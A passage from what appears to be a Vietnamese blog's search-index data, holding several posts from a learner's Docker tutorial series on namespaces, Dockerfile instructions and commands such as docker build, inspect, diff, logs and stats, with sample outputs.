command này bắt đầu bằng CMD. Ví dụ, chúng ta muốn chạy câu lệnh nginx -g daemon off; ta sẽ thực thi như sau:\n1 CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon\u0026#34;, \u0026#34;off;\u0026#34;] Step 5 - Building Containers Kết hợp những câu lệnh trên, ta có một Dockerfile nhưu sau:\n1 2 3 4 FROM nginx:1.11-alpine COPY index.html /usr/share/nginx/html EXPOSE 80 CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon\u0026#34;, \u0026#34;off;\u0026#34;] Để thực thi và tiến hành build image, ta dùng lệnh docker build:\n1 docker build -t my-image:v1 . Step 6 - Launching New Image Cuối cùng chạy image bằng lệnh docker run.\nVì những kiến thức này chúng ta đều đã thảo luận qua ở những chương trước, nên phần này tôi chỉ đi nhanh qua.\n","description":"Docker Foundation (tiếp theo)","id":17,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P7)","uri":"https://minhlongmt183.github.io/posts/docker_p7/"},{"content":"\rKể từ chương này, mình bắt đầu chuyển qua học nội dụng docker trên katacoda.com. Và cách học mình cũng sẽ khác, tóm tắt bằng sơ đồ tư duy và trình bày lại những gì mình hiểu sau khi học được trên blog theo flow của sơ đồ tư duy. Mục đích của blog này giúp mình ôn lại, hiểu rõ hơn những kiến thức đã học.\rTổng quan về khóa học Trong khóa học này, mình sẽ đi qua một số chủ đề chính như hình bên dưới. Trong những chủ đề này có những chủ đề mới và những chủ đề đã đề cập qua trong khóa học của anh XuanThuLabChanel. Những phần đã nói qua thì sẽ không nói lại mà chỉ ghi chú thêm những mục mới, chưa đề cập ở những phần trước đó.\nWhat is the container Những khái niệm căn bản về container đã được đề cập khá nhiều ở trong bài docker_overview và ở p1 trong chuỗi bài học từ anh XuanThuLabChanel. Trong phần này chúng ta sẽ đi qua một số khái niệm cũng như một số chủ đề:\nnamespaces Khái niệm: Namespace - không gian tên:\nLà một trong những thành phần cơ bản của container.\ngiới hạn những gì các process có thể thấy và truy cập trên hệ thống.\nđịnh nghĩa vị trí inode trên đĩa.\ninode là một cấu trúc dữ liệu trong một hệ thống tập tin Unix - phong cách mô tả của một tập tin hệ thống đối tượng như một tập tin hoặc một thư mục. Số lượng nút trong tài khoản bằng với số lượng tệp và thư mục có trên đó. Hay có thể hiểu, inodes = số files + folder.\nThông qua một namespace, nhiều process khác nhau có thể chia sẻ, giao tiếp với nhau.\nKhi một container bắt đầu chạy, nó sẽ tạo ra một namespace mới cho để các process chạy trong hộp cát (sandboxes) chạy. Bằng cách phân bổ namespace dựa trên các pid, tại thời điểm chạy, một process sẽ truy cập vào namespace tương ứng với pid của mình, việc này giúp cho process có cảm giác chỉ một mình nó chạy trên hệ thống.\nMột số loại biến thể của namespace Trong namespace định nghĩa một số biến thể:\nMount (mnt): mount namespace điều khiển các mount point. Khi tạo, các liên kết từ mount namespace hiện tại được sao chép sang không gian tên mới, nhưng các mount point được tạo sau đó không truyền giữa mount namespace. Cờ sao chép được sử dụng để tạo không gian tên mới thuộc loại này là CLONE_NEWNS - viết tắt của \u0026ldquo;NEW NameSpace\u0026rdquo;. Thuật ngữ này không mang tính mô tả (vì nó không cho biết loại không gian tên nào sẽ được tạo) bởi vì mount namespaces là loại namespace đầu tiên và tại thời điểm, các nhà thiết kế không lường trước được sẽ có bất kỳ loại namespaces nào khác.\nProcess ID(pid): PID namespaces cung cấp những process với tập pid độc lập với những namespace khác. Các PID namespace có thể lồng vào nhau nghĩa là: mỗi process được tạo trong một namespace sẽ có 1 pid, và pid này sẽ được thấy bởi các process ở trong namespace hiện tại ra cho đến namespace đầu tiên. Nghe có vẻ giống như trong công ty, một nhân viên mới vào sẽ có một thông tin và định danh riêng, những thông tin này sẽ được biết bởi sếp anh ta, sếp của sếp, sếp của sếp của sếp 🤣🤣🤣.\nProcess đầu tiên sẽ được gán PID là 1, nó có vị trí giống như chủ tich hội đồng quản trị của công ty, từ trên nhìn xuống có thể thấy tất cả những process khác, và có quyền \u0026ldquo;đuổi\u0026rdquo; tất cả những process dưới trướng của mình.\nUser ID (user): User namespace là một tính năng để cung cấp khả năng phân quyền và phân nhóm người dùng trên nhiều process, khả nằng đã sẵn có từ kernel 3.8. Với quyền admin, có thể xây dựng một container có vẻ như có quyền admin nhưng không thực sự cấp các đặc quyền nâng cao cho các process của người dùng. Giống như PID namespace, user namespace dùng được lồng vào nhau và mỗi user namespace mới được coi là con của user namespace đã tạo ra nó.\nUser namespace chứa một bảng ánh xạ để chuyển đổi các user ID từ container sang hệ thống. Điều này cho phép, ví dụ, người dùng root có user id 0 trong container nhưng thực sự được hệ thống coi là user id 1.400.000 để kiểm tra quyền sở hữu. Một bảng tương tự được sử dụng để ánh xạ group id và kiểm tra quyền sở hữu.\nĐể tạo điều kiện thuận lợi cho việc cô lập đặc quyền của các hành động admin, mỗi loại namespace được coi là thuộc sở hữu của một user namespace dựa trên user namespace đang hoạt động tại thời điểm tạo. Người dùng quyền admin trong user namespace thích hợp sẽ được phép thực hiện các hành động admin trong loại namespace đó. Ví dụ: nếu một process có quyền quản trị để thay đổi địa chỉ IP của giao diện mạng, nó có thể làm như vậy miễn là user namespace của chính nó giống với (hoặc tổ tiên của) user namespace sở hữu network namespace. Do đó user namespace ban đầu có quyền kiểm soát quản trị đối với tất cả các loại user namespace trong hệ thống.\nNetwork (net): Network namespace ảo hóa network stack. Khi được tạo, network namespace chỉ chứa một loopback interface. Mỗi network interface (là physical hay virtual) thể hiện chính xác một namespace và có thể di chuyển giữa các namespace với nhau.\nMột namespace sẽ có tập các địa chỉ IP riêng, chứa những routing table, socket listing, connection tracking table, firewall, và những resources liên quan tới network khác.\nKhi hủy một không gian tên mạng sẽ phá hủy bất kỳ giao diện ảo nào bên trong nó và di chuyển bất kỳ giao diện vật lý nào bên trong nó trở lại không gian tên mạng ban đầu.\nInterprocess Communication (ipc): ipc namespace dùng để cô lập các process trong giao tiếp. Điều này ngăn không cho các quá trình trong các vùng tên IPC khác nhau sử dụng, chẳng hạn như nhóm hàm SHM để thiết lập phạm vi bộ nhớ dùng chung giữa hai quá trình. Thay vào đó, mỗi quá trình sẽ có thể sử dụng cùng một số nhận dạng cho một vùng bộ nhớ dùng chung và tạo ra hai vùng riêng biệt như vậy.\nUTS: UTS namespace (UNIX Time-Sharing) cho phép một hệ thống duy nhất có vẻ như có các tên miền và máy chủ lưu trữ khác nhau cho các quá trình khác nhau. \u0026ldquo;Khi một quy trình tạo một vùng tên UTS mới \u0026hellip; tên máy chủ và miền của vùng tên UTS mới được sao chép từ các giá trị tương ứng trong vùng tên UTS của người gọi\u0026rdquo;.\nCòn nhiều loại biến thể khác, chúng ta có thể xem chúng tại đây. Unshare tool là công cụ giúp chúng ta có thể chạy một process và yêu cầu nó tạo ra một namespace mới. 1 2 3 4 5 6 7 $ sudo unshare --fork --pid --mount-proc bash $ ps PID TTY TIME CMD 1 pts/0 00:00:00 bash 9 pts/0 00:00:00 ps $ exit exit What happens when we share a namespace? Chúng ta có thể liệt kê tất cả những namespace bằng lệnh:\n1 ls -lha /proc/$DBPID/ns/ Một công cụ khác chúng ta có thể dùng đó là nsenter dùng để gán một process vào một không gian tên đã tồn tại, công cụ này sẽ hữu dụng khi debug.\n1 nsenter --target $DBPID --mount --uts --ipc --net --pid ps aux Container images Container images chúng ta đã được học kĩ trong các bài trước, ở đây có một số chú ý nhỏ nhỏ:\nNhững images chứa dữ liệu thô (metadata) để làm cơ sở để xây dựng những image khác. Chúng ta đã biết, images sẽ có nhiều layer, có 1 layer gốc và những layer sau là quá trình chúng ta cài đặt, thiết lâp thêm môi trường khi chạy contaier được sinh ra từ image ban đầu. Ở đây, mỗi tar file được xem như một layer, và tất cả các tar file được giải nén tới cùng môt vị trí thì Learn Docker Foundation Deploying First Docker Container Phần này chúng ta cũng đã trình bày kĩ ở những phần trước, theo sơ đồ, ta có thể thấy, để build một docker container, chúng ta có 5 bước chính:\nStep1: Tìm kiếm image thích hợp thông qua lệnh docker search, tải về bằng docker pull và chạy bằng docker run Step2: Kiểm tra những container đang chạy: docker ps: liệt kê tất cả các container đang chạy và các thông tin về nó docker inspect: cung cấp thông tin chi tiết về một container đang chạy. docker logs: những message mà container đã log khi chạy. Step3: Truy cập vào container đang chạy. Ở đây, đối với một container đang chạy để lấy port của nó ta có thể dùng một trong 2 lệnh: 1 2 docker ps docker port container_id port_number Step 4: Thiết lập chia sẻ dữ liệu giữa container và host cũng như các container với nhau, đảm bảo dữ liệu cần thiết sẽ được lưu khi container bị xóa. Step 5: Chạy container, ở đây có một số thiết lập như -d để chạy nền hay -it để tương tác với shell.\nNhững phần này chúng ta đã được học ở những bài trước. Deploy Static HTML Website as Container Tóm tắt cho phần này\nCreate Dockerfile Docker file là gì? Dockerfile là một dạng file text, không có phần đuôi mở rộng, chứa tập các lệnh mô tả các bước để build một docker image.\nCú pháp của một dockerfile. Cấu trúc chung của một dockerfile có dạng\nINSTRUCTION arguments Trong đó:\nINSTRUCTION: là tên các chỉ thị có trong Dockerfile, mỗi chỉ thị thực hiện một nhiệm vụ nhất định, do dockerfile quy định. Mặc định, lệnh này phải được viết bằng chữ IN HOA arguments: nội dung mà lệnh thực hiện\nVí dụ: 1 2 FROM nginx:alpine COPY . /usr/share/nginx/html Dòng lệnh 1 để định nghĩa base images và dòng lệnh 2 để chỉ thị copy tất cả nội dụng tại vị trí hiện tại vào một địa chỉ cụ thể trên container, ở đây là /usr/share/nginx/html.\nCác chỉ thị chính trong dockerfile FROM\nChỉ định rằng image nào sẽ được làm cơ sở trong quá trình build image để thực thi những câu lệnh tiếp theo. Các image này được tải về từ Public Repository hoặc Private Reppository riêng của mỗi người.\nChỉ thị FROM là bắt buộc và phải được đặt trên cùng của Dockerfile\nCú pháp: 1 2 3 FROM \u0026lt;image\u0026gt; [AS \u0026lt;name\u0026gt;] FROM \u0026lt;image\u0026gt;[:\u0026lt;tag\u0026gt;] [AS \u0026lt;name\u0026gt;] FROM \u0026lt;image\u0026gt;[@\u0026lt;digest\u0026gt;] [AS \u0026lt;name\u0026gt;] Ví dụ:\n1 2 3 FROM ubuntu hoặc FROM ubuntu:latest LABEL\nChỉ thị LABEL được dùng để thêm các thông tin meta vào Docker Image khi chúng được build. Chúng tồn tại dưới dạng cặp key-value, lưu dưới dạng chuỗi. Có thể chỉ định nhiều label cho một Docker Image, mỗi cặp key-value là duy nhất.\nNếu cùng 1 key mà có nhiều value thì value gần nhất sẽ đè những value trước đó. Cú pháp:\n1 LABEL \u0026lt;key1\u0026gt;\u0026lt;value1\u0026gt; \u0026lt;key2\u0026gt;\u0026lt;value2\u0026gt; ... \u0026lt;key_n\u0026gt;\u0026lt;value_n\u0026gt; Có thể khai báo metadata cho Image theo từng dòng chỉ thị hoặc có thể tách ra khai báo thành từng dòng riêng biệt.\nĐể xem thông tin meta của một image, ta dùng lệnh docker inspect\n1 docker inspect \u0026lt;image id\u0026gt; MAINTAINER\nDùng để khai báo thông tin tác giả của dockerfile\nCú pháp: 1 MAINTAINER \u0026lt;name\u0026gt; [\u0026lt;email\u0026gt;] Ví dụ:\n1 MAINTAINER \u0026lt;edisc\u0026gt; [\u0026lt;edisc.ctf@gmail.com\u0026gt;] RUN\nDùng để chạy một lệnh nào đó trong quá trình build image, thường là các câu lệnh Linux. Tùy vào image gốc được khai báo trong FROM thì sẽ có các câu lệnh tương ứng.\nCú pháp: 1 2 RUN \u0026lt;command\u0026gt; RUN [\u0026#34;executable\u0026#34;, \u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;] Ví dụ\n1 2 RUN apt-get update -y RUN [\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;echo Run\u0026#34;] Ở shell form, có thể thực hiện nhiều câu lệnh bằng dấu \\:\n1 2 3 4 FROM ubuntu:latest RUN apt-get update -y \\ apt-get install vim -y apt-get install curl -y ADD\nThực hiện sao chép các tệp, thư mục từ máy đang build hoặc remote file từ src và thêm chúng vào filesystem của image dest\nCú pháp: 1 2 ADD [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] \u0026lt;src\u0026gt;... \u0026lt;dest\u0026gt; ADD [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] [\u0026#34;\u0026lt;src\u0026gt;\u0026#34;, ... \u0026#34;\u0026lt;dest\u0026gt;\u0026#34;] trong đó:\nsrc có thể là một hoặc nhiều file, thư mục dest là địa chỉ tuyệt đối hoặc được chỉ định bởi WORKDIR Ví dụ:\n1 ADD --chown=user:mygroup file* /somedir/ COPY\nGiống như ADD là copy file từ thư mục src đến dest, khác ở việc COPY không hỗ trợ copy các remote file URLs từ các nguồn trên mạng.\nCú pháp: 1 2 COPY [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] \u0026lt;src\u0026gt;... \u0026lt;dest\u0026gt; COPY [--chown=\u0026lt;user\u0026gt;:\u0026lt;group\u0026gt;] [\u0026#34;\u0026lt;src\u0026gt;\u0026#34;,... \u0026#34;\u0026lt;dest\u0026gt;\u0026#34;] ENV\nDùng để khai báo các biến môi trường. Các biến được khai báo dưới dạng key-value bằng các chuỗi. Chúng sẽ được sử dụng trong các chỉ thị tiếp theo của Dockerfile.\nCú pháp: 1 ENV \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; Ví dụ:\n1 2 ENV PORT=80 ENV USERNAME=\u0026#34;user\u0026#34; PASSWORD=\u0026#34;password\u0026#34; Các biến môi trường có thể thay đổi với lệnh docker run\n1 docker run --env \u0026lt;key\u0026gt;=\u0026lt;value\u0026gt; Các command được sử dụng ENV:\n1 2 3 4 5 6 7 8 9 10 ADD COPY ENV EXPOSE FROM LABEL STOPSIGNAL USER VOLUME WORKDIR CMD\nDùng để định nghĩa các câu lệnh được chạy sau khi container được khởi động từ image vừa build.\nCú pháp: 1 2 3 CMD [\u0026#34;executable\u0026#34;, \u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;] CMD [\u0026#34;param1\u0026#34;, \u0026#34;param2\u0026#34;] CMD command param1 param2 Ví dụ:\n1 2 FROM ubuntu:latest CMD cat password.txt USER\nThiết lập username hoặc UID để sử dụng khi chạy image và khi chạy các lệnh có trong RUN, CMD, ENTRYPOINT sau đó.\nCú pháp: 1 2 3 USER \u0026lt;user\u0026gt;[:\u0026lt;group\u0026gt;] hoặc USER \u0026lt;UID\u0026gt;[:\u0026lt;GID\u0026gt;] Ví dụ:\n1 2 3 FROM alpine:3.4 RUN useradd -G /bin/bash edisc USER edisc Build Docker Image Ta dùng lệnh docker build để tiến hành build docker image từ Dockerfile vừa tạo.\nCú pháp:\n1 docker build -t \u0026lt;image_name\u0026gt; \u0026lt;build directory\u0026gt; Ví dụ:\n1 docker build -t myimage:v1 . -t ở đây cho phép chỉ định tên image và tag của nó.\nRUN Sau khi đã tạo thành image, ta chỉ cần run nó với lệnh docker run để tiến hành chạy container.\nTổng kết Phần này chúng ta đi qua 2 nhánh chính là What is the container và Container images, ở đó chủ yếu là những kiến thức chúng ta đã thảo luận qua.\nNgoài ra, chúng ta đã đi qua một vài nhánh nhỏ của Docker Foundation. Vì phần này liên quan đến mục đích công việc của tôi, nên tôi sẽ học kĩ cũng như tìm hiểu kĩ phần này. Bài tiếp theo chúng ta sẽ cùng đi qua những nhánh kế tiếp.\n","description":"Ôn lại docker và chuyển nội dung học","id":18,"section":"posts","tags":["Docker"],"title":"Tìm hiểu và sử dụng docker (P6)","uri":"https://minhlongmt183.github.io/posts/docker_p6/"},{"content":"\rToàn bộ series này được tham khảo từ hai nguồn chính: XuanThuLabChanel và DockerDoc. Em xin chân thành cảm ơn sự cống hiến của các tác giả của những kênh nói trên.❤️❤️❤️\rTra cứu thông tin Image, Container và giám sát hoạt động container Docker Các thành phần tạo nên Container Chúng ta đã thảo luận về các khái niệm căn bản của docker ở bải trước, sau đây là những khái niệm trên dưới góc nhìn của tác giả.\nContainer: là một hộp kín để ứng dụng hoạt động. Mỗi container được tạo dựa trên một image. Khi chạy một container xuất phát từ một image, có một lớp (layer) được phép ghi thêm vào trên đỉnh của image. Do đó có thể xem: container = images + layer cho phép ghi. Và khi muốn lưu container này lại thành image mới, ta dùng lệnh docker commit. Image: như một ảnh chụp lại các cấu hình của container. Một image ở trạng thái chỉ đọc, mọi thứ thay đổi chỉ được thay đổi ở tầng trên cùng (được phép ghi) của container. Khi dùng lệnh docker commit, tầng này sẽ trở thành trạng thái chỉ đọc. Do đó, có thể thấy mỗi image đều phụ thuộc vào một hoặc nhiều image cha. platform Image: Nó là image, nhưng nó không có image cha, giống như bộ khung xương của một chú khủng long. Nó chứa các biến môi trường, các tiện ích để ứng dụng ảo hóa chạy. Registry là kho chứa các image, nơi chia sẻ, tải về các image. Dockerfile là một file cấu hình với cấu trúc sinh ra image, nó giúp tự động hóa việc tạo, chạy, sử dụng các container.\nẢnh trên cho thấy, docker bắt đầu với Platform Image để chứa các biến môi trường cần thiết để chạy. Trong quá trình container thực thi sẽ tiến hành cài đặt, bổ sung cấu hình, Layered Images 1, Layered Images 2 là images của container sau khi thực hiện lệnh docker commit và nó ở trạng thái chỉ đọc. docker image history Dùng để truy vấn thông tin lịch sử các thao tác để hình thành nên một image. Cú pháp:\n1 docker image history image_name Khi chạy, ta được kết quả như sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ❯ docker image history php:8.1.0alpha1-fpm-buster IMAGE CREATED CREATED BY SIZE COMMENT 65167ddfe773 3 days ago /bin/sh -c #(nop) CMD [\u0026#34;php-fpm\u0026#34;] 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) EXPOSE 9000 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) STOPSIGNAL SIGQUIT 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; cd /usr/local/etc; if… 26.6kB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) WORKDIR /var/www/html 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENTRYPOINT [\u0026#34;docker-php-e… 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c docker-php-ext-enable sodium 17B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) COPY multi:6dfba8f7e64bd54… 6.75kB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; savedAptMark=\u0026#34;$(apt-m… 104MB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) COPY file:ce57c04b70896f77… 587B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c set -eux; savedAptMark=\u0026#34;$(apt-m… 12.5MB \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_SHA256=131a81ef9e… 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_URL=https://downl… 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV PHP_VERSION=8.1.0alph… 0B \u0026lt;missing\u0026gt; 3 days ago /bin/sh -c #(nop) ENV GPG_KEYS=528995BFEDFB… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_LDFLAGS=-Wl,-O1 -… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_CPPFLAGS=-fstack-… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_CFLAGS=-fstack-pr… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_EXTRA_CONFIGURE_A… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; mkdir -p \u0026#34;$PHP_INI_DIR… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHP_INI_DIR=/usr/loca… 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; apt-get update; apt-g… 227MB \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ENV PHPIZE_DEPS=autoconf … 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c set -eux; { echo \u0026#39;Package: php… 46B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) CMD [\u0026#34;bash\u0026#34;] 0B \u0026lt;missing\u0026gt; 4 weeks ago /bin/sh -c #(nop) ADD file:7362e0e50f30ff454… 69.3MB Qua dữ kiện trên ta biết từ thao tác cơ sở đã trải qua những bước nào để có thể tạo thành image php\ndocker inspect Lệnh này trả về thông tin của image dưới dạng JSON\n1 docker inspect image_name/id Lệnh này liệt kê tất cả các thông tin về image, ví dụ sau đây là một phần thông tin về các lớp layer của image php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026#34;RootFS\u0026#34;: { \u0026#34;Type\u0026#34;: \u0026#34;layers\u0026#34;, \u0026#34;Layers\u0026#34;: [ \u0026#34;sha256:02c055ef67f5904019f43a41ea5f099996d8e7633749b6e606c400526b2c4b33\u0026#34;, \u0026#34;sha256:d2252dfd3726823303a8f54483e10f3ed7959f33ba63ea3a19bd0fc46587bc8f\u0026#34;, \u0026#34;sha256:6c63b3f282cb455ac2e456fb99cdceab42a876603b54cc97087c17b9999b780b\u0026#34;, \u0026#34;sha256:8e859e616115511355eadb05cbdcf86333434621f77c3ac80c410257ea39f115\u0026#34;, \u0026#34;sha256:363c2d4617a0df71a4d53f484a522caa9f2f02ba1271c7f7b4ceb524c5bac61a\u0026#34;, \u0026#34;sha256:c66c7f1f8019ed243ea38cb9ca384135cfeb3cda372de18deece786702c0c582\u0026#34;, \u0026#34;sha256:d87b1d289a070d7d2503bfedb8263ff5431423cd9eca8e577ce93d2e74392315\u0026#34;, \u0026#34;sha256:7d973749b6e2ff44d90f4df11576a27388c317f99400b746e8d8c021a747c91f\u0026#34;, \u0026#34;sha256:d5677f1776e8f36c5ba0cd40ff850a2e1ce919e22019bb76529ce6102c7b89ab\u0026#34;, \u0026#34;sha256:1cce6b181873aeb25ca52478d8f6c6b1c66213689085cc7a89e229ea045abd24\u0026#34; ] }, Bên cạnh đó, lệnh này còn có thể tra cứu thông tin chi tiết của container, chúng ta chỉ cần thay tên/id của image thành tên/id của container để tra cứu thông tin chi tiết của container.\ndocker diff Như đã nói ở trên, một container được sinh ra từ một platform image, sau khi docker chạy, cài đặt, chỉnh sửa, thay đổi cấu trúc bên trong rồi commit lại thành những layer. Để xem những thay đổi của cấu trúc thư mục bên trong từ thời điểm tạo ra đến thời điểm hiện tại, ta dùng lệnh docker diff. Cú pháp:\n1 docker diff container_id/name Ví dụ, ta kiểm tra từ lúc tạo ra cho đến thời điểm hiện tại, cấu trúc thư mục bên trong container c-php đã thay đổi như thế nào:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ❯ docker diff c-php C /home A /home/SharedData C /usr C /usr/local C /usr/local/lib C /usr/local/lib/php C /usr/local/lib/php/extensions C /usr/local/lib/php/extensions/no-debug-non-zts-20201009 A /usr/local/lib/php/extensions/no-debug-non-zts-20201009/mysqli.so A /usr/local/lib/php/extensions/no-debug-non-zts-20201009/pdo_mysql.so C /usr/local/etc C /usr/local/etc/php C /usr/local/etc/php/conf.d A /usr/local/etc/php/conf.d/docker-php-ext-mysqli.ini A /usr/local/etc/php/conf.d/docker-php-ext-pdo_mysql.ini C /usr/local/include C /usr/local/include/php C /usr/local/include/php/ext A /usr/local/include/php/ext/mysqli A /usr/local/include/php/ext/mysqli/php_mysqli_structs.h A /usr/local/include/php/ext/mysqli/mysqli_mysqlnd.h ở đây kí tư C thể hiện rằng thư mục đó đã được cập nhật, còn A là thư mục đó vừa được thêm vào.\ndocker log Khi container hoạt động, dấu vết hoạt động của nó được ghi vào hệ thống log của container. Để kiểm tra log của container, chúng ta dùng lệnh:\n1 docker logs container_name/id Ví dụ ta kiểm tra log của c-php xem trong quá trình hoạt động nó đã ghi những gì:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 ❯ docker logs c-php [11-Jun-2021 07:15:23] NOTICE: fpm is running, pid 1 [11-Jun-2021 07:15:23] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:07:16:07 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 07:17:34] NOTICE: Finishing ... [11-Jun-2021 07:17:34] NOTICE: exiting, bye-bye! [11-Jun-2021 07:17:35] NOTICE: fpm is running, pid 1 [11-Jun-2021 07:17:35] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:07:17:42 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:17:48 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:17:53 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:07:17:53 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:17:58 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:18:19 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:22:34 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:22:43 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:07:22:43 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:23:32 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:07:24:31 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:26:46 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:07:36:12 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:10:39:55 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:10:39:55 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:10:39:59 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:10:40:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:11:16:52 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 11:19:58] NOTICE: Finishing ... [11-Jun-2021 11:19:58] NOTICE: exiting, bye-bye! [11-Jun-2021 11:20:00] NOTICE: fpm is running, pid 1 [11-Jun-2021 11:20:00] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:11:20:05 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:19 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 11:27:42] NOTICE: Finishing ... [11-Jun-2021 11:27:42] NOTICE: exiting, bye-bye! [14-Jun-2021 02:55:15] NOTICE: fpm is running, pid 1 [14-Jun-2021 02:55:15] NOTICE: ready to handle connections Trường hợp log quá dài, ta có thể chỉ định số dòng kiểm tra bằng cách thêm option --tail so_dong\n1 2 3 4 5 6 7 8 9 10 11 ❯ docker logs --tail 10 c-php [11-Jun-2021 11:20:00] NOTICE: ready to handle connections 172.23.0.4 - 11/Jun/2021:11:20:05 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /index.php\u0026#34; 302 172.23.0.4 - 11/Jun/2021:11:20:09 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:19 +0000 \u0026#34;GET /wp-admin/setup-config.php\u0026#34; 200 172.23.0.4 - 11/Jun/2021:11:22:43 +0000 \u0026#34;POST /wp-admin/setup-config.php\u0026#34; 500 [11-Jun-2021 11:27:42] NOTICE: Finishing ... [11-Jun-2021 11:27:42] NOTICE: exiting, bye-bye! [14-Jun-2021 02:55:15] NOTICE: fpm is running, pid 1 [14-Jun-2021 02:55:15] NOTICE: ready to handle connections Để kiểm tra log theo thời gian thực khi docker đang chạy, ta thêm tùy chọn -f vào:\n1 docker logs -f container_name/id docker stats Khi container đang chạy, nó có sử dụng các tài nguyên của hệ thống, để giám sát mức độ sử dụng tài nguyên, ta sử dụng cú pháp:\n1 docker stats container_name/id khi dùng\n1 docker stats mặc định, nó sẽ giám sát toàn bộ container đang chạy trên hệ thống\nProcess docker top 1 docker top docker_name/id Dùng để xem thông tin về tiến trình (process) của docker, bao gồm PID (process Id) và PPID (Parent Process Id).\nChúng ta còn có thể xem thông tin về các tiến trình ở dạng cây:\n1 pstree -c -p -A $(pgrep dockerd) ","description":"Tra cứu thông tin Image, Container và giám sát hoạt động container 